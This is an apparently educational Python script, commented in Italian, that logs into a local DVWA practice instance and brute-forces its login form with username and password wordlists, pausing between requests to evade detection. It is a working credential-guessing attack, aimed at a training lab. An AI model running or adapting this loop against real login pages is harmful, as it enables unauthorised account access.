import requests
import time
from termcolor import colored 

login_url = "http://127.0.0.1/DVWA/login.php" # link login
brute_url = "http://127.0.0.1/DVWA/vulnerabilities/brute/" # link bruteforce
username = "admin" 
password = "password"

session = requests.Session()

    # Effettuo il login
login_data = {
"username": username,
"password": password,
"Login": "Login"
}
response = session.post(login_url, data=login_data) # Login POST
response = session.get(brute_url) # Cerco di accedere alla pagina di bruteforce

if response.status_code == 200 and "Vulnerability: Brute Force" in response.text: # verifico se sono dentro alla pagina richiesta dopo il login
    print("Login effettuato con successo")
else:
    print("Errore durante il login")


    # Verifica se l'accesso è avvenuto con successo ed eseguo il bruteforce
if response.status_code == 200:
        print("DVWA")
        print("")
        print("Accesso alla pagina effettuato con successo, Sono qui : '" + colored(brute_url, 'red') + "'")
        print("")
        #Parte user 
        username_file_utente = str(input("Inserisci la PATH della lista degli username che vuoi utilizzare: (es: /home/kali/Desktop/usernames.txt)")).strip() #Stringa senza spazi 
        print("") # Spazio
        password_file_utente = str(input("Inserisci la PATH della lista delle password che vuoi utilizzare: (es: /home/kali/Desktop/password.txt) ")).strip() #Stringa senza spazi
        print("")
        secondi = int(input("Inserisci i secondi tra una richiesta e l'altra (0-5): ")) # Secondi int
        # Parametri get url
        username_file = open(username_file_utente) # Apro il file dell'utente
        password_file = open(password_file_utente) # Apro il file dell'utente
        funzionanti=""

        user_list = username_file.readlines() #Leggo il file con gli username inserito dall'utente
        pwd_list = password_file.readlines() #Leggo il file con le password inserite dall'utente

        trovata = False #Imposto la variabile in false

        for user in user_list: #Fornisco un loop in base alla lunghezza della userlist(Parole)
          user = user.rstrip() #Spazi a destra
          for pwd in pwd_list:  #Fornisco un loop in base alla lunghezza della userlist(Parole)
            pwd = pwd.rstrip() #Spazi a destra

            
            time.sleep(secondi) # Imposto um timer per le richieste( COsi si evita il Dos e la rilevazione)
        
            basicquery = "username=" + str(user) + "&password=" + str(pwd) + "&Login=Login" # Stringa GET per la pagina di bruteforce (URL)
            url_with_params = brute_url + '?' + basicquery # Unisco il link iniziale con i parametri get e aggiunge il punto di domanda per il parametro get
            queryconget = session.get(url_with_params) # Invio la richiesta con i nuovi parametri get 
            if "Username and/or password incorrect" in str(queryconget.content): # Se trovo questa stringa il login è fallito #DVWA ma nella pagina del bruteforce
             print("Tentativo fallito con :", user, "-", pwd)
             print(url_with_params)
            else:
             print("Username e password funzionanti:", user, "-", pwd) # Questi funzionano
             funzionanti= "L'username che devi utilizzare è  : '" + user + "'"+ " e la password è '" + pwd + "'"
             trovata=True # Se la trova la imposto a True
             colored(url_with_params, 'red')
             break #Interrompo il loop
    
print("")   #
if funzionanti == "":
    print ("Nessuna password è stata trovata") # Coloro la risposta
else:
    print (colored(funzionanti, 'red')) # Coloro la risposta
    username_file.close() #Chiudo il file
    password_file.close() #Chiudo il file

     
